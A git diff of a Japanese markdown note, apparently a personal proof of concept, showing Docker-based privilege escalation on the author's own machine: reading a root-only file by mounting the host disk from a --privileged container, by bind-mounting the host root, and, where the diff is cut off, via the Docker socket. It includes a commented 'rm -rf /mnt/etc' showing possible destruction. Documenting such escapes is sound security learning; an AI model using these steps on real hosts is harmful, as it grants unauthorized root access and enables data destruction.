@@ -1,4 +1,8 @@
-## /rootに検証用のファイルを作成
+# docker権限昇格PoC
+
+## 準備
+
+### /rootに検証用のファイルを作成
 
 ```bash
 banister@~/projects/OreshicRecord vuln$ echo 'root only'
@@ -8,7 +12,7 @@ banister@~/projects/OreshicRecord vuln$ echo 'root only'
 root only
 ```
 
-## 一般ユーザーでは開けないことの確認
+### 一般ユーザーでは開けないことの確認
 
 ```bash
 banister@~/projects/OreshicRecord vuln$ cat /root/secret.txt
@@ -18,7 +22,54 @@ banister@~/projects/OreshicRecord vuln$ cat /root/secret.txt
 cat: /root/secret.txt: 許可がありません
 ```
 
-## DockerAPIをソケットで渡してコンテナ起動
+## PoC
+
+### 1. コンテナにホストとほぼ同じ権限をつけて起動
+
+```bash
+banister@~/projects/OreshicRecord vuln$ docker run -it --privileged ubuntu
+```
+
+```
+# ホストのデバイスを確認
+root@c32ac14ace1c:/# lsblk
+NAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+sda      8:0    0   200G  0 disk 
+|-sda1   8:1    0     1M  0 part 
+|-sda2   8:2    0   513M  0 part 
+`-sda3   8:3    0 199.5G  0 part /etc/hosts
+                                 /etc/hostname
+                                 /etc/resolv.conf
+sr0     11:0    1  1024M  0 rom  
+
+#-- ホストのデバイスをコンテナにマウント
+root@c32ac14ace1c:/# mount /dev/sda3 /mnt
+
+#-- 本来見えてはいけないものが見える
+root@c32ac14ace1c:/# cat /mnt/root/secret.txt 
+root only
+
+#-- 破壊も可能
+#-- root@c32ac14ace1c:/# cat /mnt/root/secret.txt 
+#-- rm -rf /mnt/etc
+```
+
+
+### 2. ホストの/をコンテナ内の/hostにマウントして起動
+
+```bash
+banister@~/projects/OreshicRecord vuln$ docker run -it -v /:/host ubuntu
+```
+
+```
+root@e62ea093e534:/# ls /host
+bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var
+
+root@e62ea093e534:/# cat /host/root/secret.txt 
+root only
+```
+
+### 3. DockerAPIをソケットで渡してコンテナ起動
 
 ```bash
 banister@~/projects/OreshicRecord vuln$ docker run -it -v /var/run/docker.sock:/var/run/docker.sock docker:cli
